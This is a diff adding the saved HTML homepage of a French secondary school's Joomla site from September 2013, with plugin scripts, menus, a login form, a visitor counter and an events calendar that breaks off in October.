@@ -1,0 +1,984 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr-fr" lang="fr-fr" >
+
+<head>
+
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="robots" content="index, follow" />
+  <meta name="keywords" content="COLLEGE  - SAINT JOSEPH - Section sportive , Comedie musicale - Projet" />
+  <meta name="description" content="Education Collège saint joseph SEGRE" />
+  <meta name="generator" content="Joomla! 1.5 - Open Source Content Management" />
+  <title>Bienvenue sur la page d'Accueil</title>
+  <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/index.php?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link rel="stylesheet" href="/plugins/system/jceutilities/css/jceutilities.css?v=224" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jceutilities/themes/standard/css/style.css?version=224" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jceutilities/themes/standard/css/style_ie6.css?v=224" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jcemediabox/css/jcemediabox.css?v=1013" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jcemediabox/css/jcemediabox_ie6.css?v=1013" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jcemediabox/themes/standard/css/style.css?version=1013" type="text/css" />
+  <link rel="stylesheet" href="/plugins/system/jcemediabox/themes/standard/css/style_ie6.css?v=1013" type="text/css" />
+  <link rel="stylesheet" href="/plugins/content/highslide/highslide.css" type="text/css" />
+  <link rel="stylesheet" href="/plugins/content/highslide/config/css/highslide-sitestyles.css" type="text/css" />
+  <link rel="stylesheet" href="/components/com_jevents/views/default/assets/css/modstyle.css" type="text/css" />
+  <style type="text/css">
+    <!--
+.closebutton {
+    /* NOTE! This URL is relative to the HTML page, not the CSS */
+	filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(
+		src='/plugins/content/highslide/graphics/close.png', sizingMethod='scale');
+
+	background: none;
+	cursor: hand;
+}
+
+/* Viewport fixed hack */
+.highslide-viewport {
+	position: absolute;
+    left: expression( ( ( ignoreMe1 = document.documentElement.scrollLeft ? document.documentElement.scrollLeft : document.body.scrollLeft ) ) + 'px' );
+	top: expression( ( ignoreMe2 = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop ) + 'px' );
+	width: expression( ( ( ignoreMe3 = document.documentElement.clientWidth ? document.documentElement.clientWidth : document.body.clientWidth ) ) + 'px' );
+	height: expression( ( ( ignoreMe4 = document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body.clientHeight ) ) + 'px' );
+}
+
+/* Thumbstrip PNG fix */
+.highslide-scroll-down, .highslide-scroll-up {
+	position: relative;
+	overflow: hidden;
+}
+.highslide-scroll-down div, .highslide-scroll-up div {
+	/* NOTE! This URL is relative to the HTML page, not the CSS */
+	filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(
+		src='/plugins/content/highslide/graphics/scrollarrows.png', sizingMethod='scale');
+	background: none !important;
+	position: absolute;
+	cursor: hand;
+	width: 75px;
+	height: 75px !important;
+}
+.highslide-thumbstrip-horizontal .highslide-scroll-down div {
+	left: -50px;
+	top: -15px;
+}
+.highslide-thumbstrip-horizontal .highslide-scroll-up div {
+	top: -15px;
+}
+.highslide-thumbstrip-vertical .highslide-scroll-down div {
+	top: -50px;
+}
+
+/* Thumbstrip marker arrow trasparent background fix */
+.highslide-thumbstrip .highslide-marker {
+	border-color: white; /* match the background */
+}
+.dark .highslide-thumbstrip-horizontal .highslide-marker {
+	border-color: #111;
+}
+.highslide-viewport .highslide-marker {
+	border-color: #333;
+}
+.highslide-thumbstrip {
+	float: left;
+}
+
+/* Positioning fixes for the control bar */
+.text-controls .highslide-controls {
+	width: 480px;
+}
+.text-controls a span {
+	width: 4em;
+}
+.text-controls .highslide-full-expand a span {
+	width: 0;
+}
+.text-controls .highslide-close a span {
+	width: 0;
+}
+.sspreset-thumbstrip .highslide-thumbstrip-horizontal .highslide-marker {
+	border-color: #000;
+}
+.sspreset-thumbstrip .highslide-thumbstrip-horizontal .highslide-scroll-down div {
+	left: -50px;
+	top: -24px;
+}
+.sspreset-thumbstrip .highslide-thumbstrip-horizontal .highslide-scroll-up div {
+	top: -24px;
+}
+    -->
+  </style>
+  <script type="text/javascript" src="/media/system/js/mootools.js"></script>
+  <script type="text/javascript" src="/plugins/system/jceutilities/js/mediaobject.js?v=224"></script>
+  <script type="text/javascript" src="/plugins/system/jceutilities/js/jceutilities.js?v=224"></script>
+  <script type="text/javascript" src="/plugins/system/jcemediabox/js/jcemediabox.js?v=1013"></script>
+  <script type="text/javascript" src="/plugins/system/jcemediabox/js/mediaobject.js?v=1013"></script>
+  <script type="text/javascript" src="/plugins/system/jcemediabox/addons/default.js?v=1013"></script>
+  <script type="text/javascript" src="/media/system/js/caption.js"></script>
+  <script type="text/javascript" src="/plugins/content/highslide/highslide-full.packed.js"></script>
+  <script type="text/javascript" src="/plugins/content/highslide/easing_equations.js"></script>
+  <script type="text/javascript" src="/plugins/content/highslide/swfobject.js"></script>
+  <script type="text/javascript" src="/plugins/content/highslide/config/js/highslide-sitesettings.js"></script>
+  <script type="text/javascript" src="/plugins/system/plugmaccess/gmaccessjs.js"></script>
+  <script type="text/javascript" src="/plugins/content/avreloaded/silverlight.js"></script>
+  <script type="text/javascript" src="/plugins/content/avreloaded/wmvplayer.js"></script>
+  <script type="text/javascript" src="/plugins/content/avreloaded/swfobject.js"></script>
+  <script type="text/javascript" src="/plugins/content/avreloaded/avreloaded.js"></script>
+  <script type="text/javascript">
+	MediaObject.init({flash:"10,0,22,87",windowmedia:"5,1,52,701",quicktime:"6,0,2,0",realmedia:"7,0,0,0",shockwave:"8,5,1,0"});window.addEvent('domready', function(){window.jcepopup=new JCEUtilities({popup:{legacy:1,resize:1,icons:1,overlay:1,overlayopacity:0.8,overlaycolor:"#000000",fadespeed:500,scalespeed:500,hideobjects:1,scrollpopup:1},tooltip:{className:"tooltip",opacity:1,speed:150,position:"br",offsets:{x: 16, y: 16}},imgpath:"plugins/system/jceutilities/img",theme:"standard",themecustom:"",themepath:"plugins/system/jceutilities/themes"});});	JCEMediaObject.init('/', {flash:"10,0,22,87",windowmedia:"5,1,52,701",quicktime:"6,0,2,0",realmedia:"7,0,0,0",shockwave:"8,5,1,0"});JCEMediaBox.init({popup:{width:"",height:"",legacy:0,lightbox:0,shadowbox:0,resize:1,icons:1,overlay:1,overlayopacity:0.8,overlaycolor:"#000000",fadespeed:500,scalespeed:500,hideobjects:1,scrolling:"fixed",close:2,labels:{'close':'Fermer','next':'Suivant','previous':'Précédent','cancel':'Annuler','numbers':'{$current} sur {$total}'}},tooltip:{className:"tooltip",opacity:0.8,speed:150,position:"br",offsets:{x: 16, y: 16}},base:"/",imgpath:"plugins/system/jcemediabox/img",theme:"standard",themecustom:"",themepath:"plugins/system/jcemediabox/themes"});hs.graphicsDir = '/plugins/content/highslide/graphics/';
+  </script>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+
+<link href="/templates/sunshine_1.5/css/template.css" rel="stylesheet" type="text/css" />
+<link href="/templates/sunshine_1.5/css/blue.css" rel="stylesheet" type="text/css" />
+
+<link rel="shortcut icon" href="/images/favicon.ico" />
+
+
+<!--[if lte IE 6]>
+<style type="text/css">
+#content {width: 99%;}
+.user_bg {width: 99%;}
+</style>
+<![endif]-->
+
+<!--
+author: Fio
+web: http://www.vonfio.de
+copyright: Creative Commons Attribution-Share Alike 3.0 Unported License
+-->
+</head>
+
+<body>
+    <div id="left_border">
+        <div id="right_border">
+            <div id="bottom">
+                <div id="bottom_right"> 
+                    <div id="bottom_left">
+                    	<div id="container">
+                            <div id="header">
+                                <div id="date">Lundi, 09.09.2013</div>
+                                <div id="pathway"><span class="breadcrumbs pathway">
+Home</span>
+</div>
+                                                                <div id="search_out">
+                                	<div id="search">		<div class="moduletable">
+					<form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Recherche" class="inputbox" type="text" size="20" value="recherche..."  onblur="if(this.value=='') this.value='recherche...';" onfocus="if(this.value=='recherche...') this.value='';" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value=1 />
+</form>		</div>
+	</div>
+                                </div>
+							                              </div>
+                            <div id="banner_out">
+                                <div id="banner_in">
+									                                    <div class="sitetitle"></div>
+                                </div>           
+                            </div>
+                            <div id="topmenu_out">
+                                <div id="topmenu_left">
+                                    <div id="topmenu_right">
+                                    	<div id="topmenu">		<div class="moduletable">
+					<ul id="mainlevel-nav"><li><a href="/index.php?option=com_content&amp;view=article&amp;id=55&amp;Itemid=28" class="mainlevel-nav" >L'historique</a></li><li><a href="/index.php?option=com_content&amp;view=article&amp;id=72&amp;Itemid=70" class="mainlevel-nav" >Carte d'identité</a></li><li><a href="/index.php?option=com_content&amp;view=article&amp;id=126&amp;Itemid=29" class="mainlevel-nav" >Nos locaux</a></li><li><a href="/index.php?option=com_content&amp;view=section&amp;id=16&amp;Itemid=18" class="mainlevel-nav" >Actualités</a></li><li><a href="/index.php?option=com_phocagallery&amp;view=categories&amp;Itemid=30" class="mainlevel-nav" >L'album Photos</a></li><li><a href="/index.php?option=com_jevents&amp;task=month.calendar&amp;Itemid=59" class="mainlevel-nav" >Le calendrier</a></li><li><a href="/index.php?option=com_content&amp;view=section&amp;id=10&amp;Itemid=62" class="mainlevel-nav" >Les Projets d'Actions Educatives</a></li><li><a href="/index.php?option=com_content&amp;view=article&amp;id=95&amp;Itemid=72" class="mainlevel-nav" >Contacts</a></li></ul>		</div>
+	</div>    
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="maincontent">
+								                                	<div id="left_out">		<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>Souvenirs ....</h3>
+											<div align="center">
+	<img src="/images/imagesH1/image 19.jpg" alt="image 19.jpg" width="100" height="74" /></div>					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module_menu">
+			<div>
+				<div>
+					<div>
+													<h3>Menu principal</h3>
+											<ul class="menu"><li id="current" class="active item1"><a href="http://college-stjo-segre-ec49.org/"><span>Page d'accueil</span></a></li><li class="item73"><a href="/index.php?option=com_content&amp;view=article&amp;id=106&amp;Itemid=73"><span>Notre Projet</span></a></li><li class="item27"><a href="/index.php?option=com_content&amp;view=section&amp;id=5&amp;Itemid=27"><span>Les matières enseignées</span></a></li><li class="item79"><a href="/index.php?option=com_content&amp;view=section&amp;id=23&amp;Itemid=79"><span>Informations par niveau</span></a></li><li class="item2"><a href="/index.php?option=com_content&amp;view=section&amp;id=14&amp;Itemid=2"><span>La Pastorale</span></a></li><li class="item37"><a href="/index.php?option=com_content&amp;view=section&amp;id=9&amp;Itemid=37"><span>Le sport à St JO</span></a></li><li class="item50"><a href="http://www.comediemusicalesaintjosegre.fr"><span>Les Comédies Musicales</span></a></li><li class="item74"><a href="/index.php?option=com_content&amp;view=section&amp;id=22&amp;Itemid=74"><span>CDI</span></a></li><li class="item75"><a href="/index.php?option=com_content&amp;view=article&amp;id=104&amp;Itemid=75"><span>Résultats du brevet</span></a></li><li class="item76"><a href="/index.php?option=com_content&amp;view=article&amp;id=232&amp;Itemid=76"><span>La rentrée 2013</span></a></li><li class="item77"><a href="/index.php?option=com_easybookreloaded&amp;view=easybookreloaded&amp;Itemid=77"><span>Livre d'Or</span></a></li><li class="item80"><a href="/index.php?option=com_content&amp;view=section&amp;id=6&amp;Itemid=80"><span>Evènements du Collège</span></a></li><li class="item83"><a href="/index.php?option=com_remository&amp;Itemid=83"><span>Télécharger</span></a></li></ul>					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module_menu">
+			<div>
+				<div>
+					<div>
+													<h3>Ressources</h3>
+											<ul class="menu"><li class="item84"><a href="http://st-joseph-segre.e-lyco.fr/"><span>Vers l'ENT STJO SEGRE</span></a></li><li class="item85"><a href="http://cent.ac-nantes.fr"><span>Pour CREER son compte ENT</span></a></li><li class="item17"><a href="/administrator/"><span>Administrateur</span></a></li><li class="item11"><a href="http://217.128.117.180:8080/pronote/"><span>Espace Evaluations</span></a></li><li class="item66"><a href="/index.php?option=com_jevents&amp;view=icalevent&amp;task=icalevent.edit&amp;Itemid=66"><span>Evènements (privé)</span></a></li><li class="item67"><a href="/index.php?option=com_content&amp;view=article&amp;id=50&amp;Itemid=67"><span>Plan d'accès</span></a></li><li class="item71"><a href="/index.php?option=com_content&amp;view=article&amp;layout=form&amp;Itemid=71"><span>Espace enseignants</span></a></li><li class="item78"><a href="http://217.128.117.180/grr/"><span>Réservation de salles</span></a></li><li class="item86"><a href="/index.php?option=com_content&amp;view=article&amp;id=258&amp;Itemid=86"><span>ORIENTATION</span></a></li></ul>					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module_menu">
+			<div>
+				<div>
+					<div>
+													<h3>Menu Utilisateur</h3>
+											<ul class="menu" />					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+											<form action="/index.php" method="post" name="login" id="form-login" >
+		<fieldset class="input">
+	<p id="form-login-username">
+		<label for="modlgn_username">Identifiant</label><br />
+		<input id="modlgn_username" type="text" name="username" class="inputbox" alt="username" size="18" />
+	</p>
+	<p id="form-login-password">
+		<label for="modlgn_passwd">Mot de passe</label><br />
+		<input id="modlgn_passwd" type="password" name="passwd" class="inputbox" size="18" alt="password" />
+	</p>
+		<p id="form-login-remember">
+		<label for="modlgn_remember">Se souvenir de moi</label>
+		<input id="modlgn_remember" type="checkbox" name="remember" class="inputbox" value="yes" alt="Remember Me" />
+	</p>
+		<input type="submit" name="Submit" class="button" value="Connexion" />
+	</fieldset>
+	<ul>
+		<li>
+			<a href="/index.php?option=com_user&amp;view=reset">
+			Mot de passe oublié ?</a>
+		</li>
+		<li>
+			<a href="/index.php?option=com_user&amp;view=remind">
+			Identifiant oublié ?</a>
+		</li>
+			</ul>
+	
+	<input type="hidden" name="option" value="com_user" />
+	<input type="hidden" name="task" value="login" />
+	<input type="hidden" name="return" value="Lw==" />
+	<input type="hidden" name="4d1554edf84a413a6190c91005eb0289" value="1" /></form>
+					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>AllVideos Reloaded</h3>
+																</div>
+				</div>
+			</div>
+		</div>
+	</div>
+                                                                                                	<div id="right_out">		<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>Qui est en ligne ?</h3>
+											Nous avons&nbsp;13 invités&nbsp;en ligne					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>Nos visiteurs</h3>
+											<!-- Vinaora Visitors Counter for Joomla! --><div><div style="text-align: center;"><img src="http://college-stjo-segre-ec49.org/modules/mod_vvisit_counter/images/digit_counter/default/4.png" style="margin:0; padding:0; border:0px none; " alt="mod_vvisit_counter" title="Vinaora Visitors Counter 1.7.3" /><img src="http://college-stjo-segre-ec49.org/modules/mod_vvisit_counter/images/digit_counter/default/3.png" style="margin:0; padding:0; border:0px none; " alt="mod_vvisit_counter" title="Vinaora Visitors Counter 1.7.3" /><img src="http://college-stjo-segre-ec49.org/modules/mod_vvisit_counter/images/digit_counter/default/4.png" style="margin:0; padding:0; border:0px none; " alt="mod_vvisit_counter" title="Vinaora Visitors Counter 1.7.3" /><img src="http://college-stjo-segre-ec49.org/modules/mod_vvisit_counter/images/digit_counter/default/4.png" style="margin:0; padding:0; border:0px none; " alt="mod_vvisit_counter" title="Vinaora Visitors Counter 1.7.3" /><img src="http://college-stjo-segre-ec49.org/modules/mod_vvisit_counter/images/digit_counter/default/5.png" style="margin:0; padding:0; border:0px none; " alt="mod_vvisit_counter" title="Vinaora Visitors Counter 1.7.3" /><img src="http://college-stjo-segre-ec49.org/modules/mod_vvisit_counter/images/digit_counter/default/9.png" style="margin:0; padding:0; border:0px none; " alt="mod_vvisit_counter" title="Vinaora Visitors Counter 1.7.3" /></div><div style="text-align: center;"><a href="http://vinaora.com/joomla/vinaora-visitors-counter.html" target="_self" title="Vinaora Visitors Counter 1.7.3 for Joomla!" style="border:0px none; text-decoration:none; ">Visitors Counter</a></div></div>					</div>
+				</div>
+			</div>
+		</div>
+			<div class="module">
+			<div>
+				<div>
+					<div>
+													<h3>Agenda</h3>
+											<div style="margin:0px;padding:0px;border-width:0px;"><span id='testspan49' style='display:none'></span>
+
+<table cellpadding="0" cellspacing="0" align="center" class="mod_events_monthyear" >
+<tr >
+<td>Septembre 2013</td></tr>
+</table>
+<table align="center" class="mod_events_table" cellspacing="0" cellpadding="2" >
+<tr class="mod_events_dayname">
+<td class="mod_events_td_dayname"><span class="sunday">D</span></td>
+<td class="mod_events_td_dayname">L</td>
+<td class="mod_events_td_dayname">Ma</td>
+<td class="mod_events_td_dayname">Me</td>
+<td class="mod_events_td_dayname">J</td>
+<td class="mod_events_td_dayname">V</td>
+<td class="mod_events_td_dayname"><span class="saturday">S</span></td>
+</tr>
+<tr>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=01&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">1</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=02&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">2</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=03&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">3</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=04&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">4</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=05&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">5</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=06&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">6</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=07&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">7</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=08&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">8</a></td>
+<td class='mod_events_td_todaynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=09&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">9</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=10&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">10</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=11&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">11</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=12&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">12</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=13&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">13</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=14&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">14</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=15&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">15</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=16&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">16</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=17&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">17</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=18&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">18</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=19&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">19</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=20&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">20</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=21&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">21</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=22&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">22</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=23&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">23</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=24&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">24</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=25&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">25</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=26&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">26</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=27&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">27</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=28&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">28</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=29&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">29</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=09&amp;day=30&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">30</a></td>
+<td class="mod_events_td_dayoutofmonth">1</td>
+<td class="mod_events_td_dayoutofmonth">2</td>
+<td class="mod_events_td_dayoutofmonth">3</td>
+<td class="mod_events_td_dayoutofmonth">4</td>
+<td class="mod_events_td_dayoutofmonth">5</td>
+</tr>
+</table>
+
+<table cellpadding="0" cellspacing="0" align="center" class="mod_events_monthyear" >
+<tr >
+<td>Octobre 2013</td></tr>
+</table>
+<table align="center" class="mod_events_table" cellspacing="0" cellpadding="2" >
+<tr class="mod_events_dayname">
+<td class="mod_events_td_dayname"><span class="sunday">D</span></td>
+<td class="mod_events_td_dayname">L</td>
+<td class="mod_events_td_dayname">Ma</td>
+<td class="mod_events_td_dayname">Me</td>
+<td class="mod_events_td_dayname">J</td>
+<td class="mod_events_td_dayname">V</td>
+<td class="mod_events_td_dayname"><span class="saturday">S</span></td>
+</tr>
+<tr>
+<td class="mod_events_td_dayoutofmonth">29</td>
+<td class="mod_events_td_dayoutofmonth">30</td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=01&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">1</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=02&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">2</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=03&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">3</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=04&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">4</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=05&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">5</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=06&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">6</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=07&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">7</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=08&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">8</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=09&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">9</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=10&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">10</a></td>
+<td class='mod_events_td_daynoevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=11&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">11</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=12&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">12</a></td>
+</tr>
+<tr>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=13&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">13</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=14&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">14</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=15&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">15</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=16&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">16</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=17&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">17</a></td>
+<td class='mod_events_td_daywithevents'>
+<a href="/index.php?option=com_jevents&amp;task=day.listevents&amp;year=2013&amp;month=10&amp;day=18&amp;Itemid=66" class = "mod_events_daylink" title = "Aller au calendrier - jour en cours">18</a></td>
+<td class='mod_events_td_daywithevents'>
